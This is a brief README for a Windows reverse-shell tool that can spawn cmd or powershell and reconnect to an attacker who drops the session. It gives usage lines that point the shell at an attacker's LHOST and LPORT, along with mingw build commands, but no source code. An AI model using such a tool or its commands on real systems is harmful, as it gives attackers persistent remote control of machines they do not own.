# windows-rev-shell
An advanced windows reverse shell. Allows to specify the type of shell (cmd or powershell) and can automatically detect if the attacker has dropped the shell and attempt to reconnect
## Usage
One shot <br>
`shell.exe LHOST LPORT <cmd|powershell>` <br>
Attempt to reconnect to the specified IP. The last parameter indicates the number of seconds between attempts <br>
`shell.exe LHOST LPORT <cmd|powershell> ATTEMPT_DELAY` <br>
## Building
32 Bit version <br>
`i686-w64-mingw32-gcc windows.c -o shell.exe -lws2_32` <br>
64 Bit version <br>
`x86_64-w64-mingw32-gcc windows.c -o shell.exe -lws2_32` <br>
